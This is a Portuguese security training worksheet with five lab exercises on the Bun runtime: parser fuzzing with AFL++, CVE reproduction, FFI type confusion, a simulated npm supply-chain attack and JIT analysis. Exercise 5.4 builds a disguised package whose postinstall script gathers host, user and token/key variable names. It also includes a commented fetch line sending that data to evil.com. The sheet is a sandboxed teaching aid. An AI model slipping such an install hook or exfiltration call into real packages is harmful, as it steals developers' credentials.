# Security — Level 05: Advanced (5 exercícios)

## Ex 5.1 — Parser Fuzzing Setup

### Objetivo
Configurar AFL++ para fuzzing do parser Bun.

### Skills
- AFL++ setup
- Corpus creation
- Crash triage

### Tarefa

1. Instalar AFL++:
```bash
sudo apt install afl++
# ou build from source para última versão
```

2. Criar corpus inicial:
```bash
mkdir -p /tmp/fuzz-lab/corpus

# JavaScript válido básico
echo 'var x = 1;' > /tmp/fuzz-lab/corpus/basic.js
echo 'function f() { return 42; }' > /tmp/fuzz-lab/corpus/func.js
echo 'const arr = [1, 2, 3];' > /tmp/fuzz-lab/corpus/array.js
echo 'class C { constructor() {} }' > /tmp/fuzz-lab/corpus/class.js

# Edge cases
echo '"\u{10FFFF}"' > /tmp/fuzz-lab/corpus/unicode.js
echo '`${`nested`}`' > /tmp/fuzz-lab/corpus/template.js
echo '0xFFFFFFFFFFFFFFFFn' > /tmp/fuzz-lab/corpus/bigint.js
```

3. Criar harness:
```bash
cat > /tmp/fuzz-lab/fuzz_parse.sh << 'EOF'
#!/bin/bash
# Harness para fuzzing do parser
bun build "$1" --dump-ast > /dev/null 2>&1
exit 0
EOF
chmod +x /tmp/fuzz-lab/fuzz_parse.sh
```

4. Executar fuzzer (curto para teste):
```bash
mkdir -p /tmp/fuzz-lab/findings
timeout 60 afl-fuzz \
    -i /tmp/fuzz-lab/corpus \
    -o /tmp/fuzz-lab/findings \
    -t 1000 \
    -- /tmp/fuzz-lab/fuzz_parse.sh @@
```

5. Analisar crashes:
```bash
ls /tmp/fuzz-lab/findings/crashes/
# Para cada crash:
# bun build /tmp/fuzz-lab/findings/crashes/id:* --dump-ast
```

### Entrega

- [ ] AFL++ instalado e funcionando
- [ ] Corpus com 10+ arquivos JS
- [ ] Fuzzing executado por 1+ hora
- [ ] Crashes triaged (se houver)
- [ ] Report de cobertura

---

## Ex 5.2 — CVE Reproduction

### Objetivo
Reproduzir um CVE conhecido do Bun ou JSC.

### Skills
- CVE research
- Vulnerability analysis
- PoC development

### Tarefa

1. Pesquisar CVEs:
```bash
# Buscar no NVD
curl -s "https://services.nvd.nist.gov/rest/json/cves/1.0?keyword=bun" | jq '.result.CVE_Items[].cve.CVE_data_meta.ID'

# Ou JSC
curl -s "https://services.nvd.nist.gov/rest/json/cves/1.0?keyword=javascriptcore" | jq '.result.CVE_Items[].cve.CVE_data_meta.ID' | head -20
```

2. Escolher CVE para reproduzir

3. Encontrar commit de fix no GitHub

4. Analisar root cause

5. Desenvolver PoC (se aplicável)

### Entrega

- [ ] CVE selecionado com justificativa
- [ ] Análise de root cause
- [ ] Commit de fix identificado
- [ ] PoC funcional (se possível)
- [ ] Writeup completo

---

## Ex 5.3 — FFI Memory Corruption

### Objetivo
Demonstrar memory corruption via FFI misuse.

### Skills
- FFI type confusion
- Memory debugging
- ASAN

### SANDBOX OBRIGATÓRIO

### Tarefa

1. Criar cenário de type confusion:
```typescript
// type_confusion.ts
import { dlopen, FFIType, ptr } from "bun:ffi";

const lib = dlopen("libc.so.6", {
  // Declarar com tipo errado propositalmente
  strlen: {
    args: [FFIType.ptr],
    returns: FFIType.i32,  // Correto seria i64 em 64-bit
  },
});

// O que acontece com strings muito longas?
const huge = "A".repeat(0xFFFFFFFF);
// Potencial integer overflow
```

2. Testar com ASAN (se Bun compilado com ASAN)

3. Documentar comportamento

### Entrega

- [ ] Cenário de type confusion documentado
- [ ] Comportamento observado
- [ ] Impacto de segurança analisado
- [ ] Mitigações propostas

---

## Ex 5.4 — Supply Chain Attack Simulation

### Objetivo
Simular ataque de supply chain via npm package.

### Skills
- npm publishing
- postinstall scripts
- Detection evasion

### SANDBOX OBRIGATÓRIO

### Tarefa

1. Criar package malicioso (em sandbox):
```bash
mkdir -p /tmp/supply-chain/evil-package
cd /tmp/supply-chain/evil-package

cat > package.json << 'EOF'
{
  "name": "totally-legit-package",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "echo 'Preinstall running...'",
    "postinstall": "node postinstall.js"
  }
}
EOF

cat > postinstall.js << 'EOF'
const fs = require('fs');
const os = require('os');

// Simular exfiltração de dados
const data = {
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: Object.keys(process.env).filter(k => k.includes('TOKEN') || k.includes('KEY'))
};

console.log('[SIMULATED EXFIL]:', JSON.stringify(data));

// Em ataque real: enviaria para C2
// fetch('https://evil.com/collect', { method: 'POST', body: JSON.stringify(data) });
EOF
```

2. Instalar localmente:
```bash
cd /tmp/supply-chain
mkdir test-project && cd test-project
npm init -y
npm link ../evil-package
```

3. Observar execução

### Entrega

- [ ] Package malicioso criado
- [ ] Instalação demonstrada
- [ ] Dados "exfiltrados" documentados
- [ ] Detecção: como identificar
- [ ] Mitigação: `--ignore-scripts`

---

## Ex 5.5 — JSC JIT Analysis

### Objetivo
Analisar comportamento do JIT compiler JSC no Bun.

### Skills
- JIT concepts
- Hot code identification
- Deoptimization triggers

### Tarefa

1. Criar código que triggera JIT:
```javascript
// hot_function.js
function hot(n) {
  let sum = 0;
  for (let i = 0; i < n; i++) {
    sum += i;
  }
  return sum;
}

// Warm up JIT
for (let i = 0; i < 100000; i++) {
  hot(100);
}

console.log(hot(1000000));
```

2. Executar com flags JSC:
```bash
JSC_showDFGDisassembly=1 bun run hot_function.js 2>&1 | head -100
JSC_dumpGraph=1 bun run hot_function.js 2>&1 | head -100
```

3. Criar código que causa deoptimização:
```javascript
// deopt.js
function polymorphic(obj) {
  return obj.x + obj.y;
}

// Warm up com um tipo
for (let i = 0; i < 10000; i++) {
  polymorphic({ x: 1, y: 2 });
}

// Agora muda o tipo - causa deopt
console.log(polymorphic({ x: "a", y: "b" }));
```

### Entrega

- [ ] Hot function identificada
- [ ] JIT tiers observados (LLInt → Baseline → DFG → FTL)
- [ ] Deoptimização triggered
- [ ] Implicações de segurança do JIT

### Tempo estimado
15 horas total

### Próximo
→ Level 06: Challenging
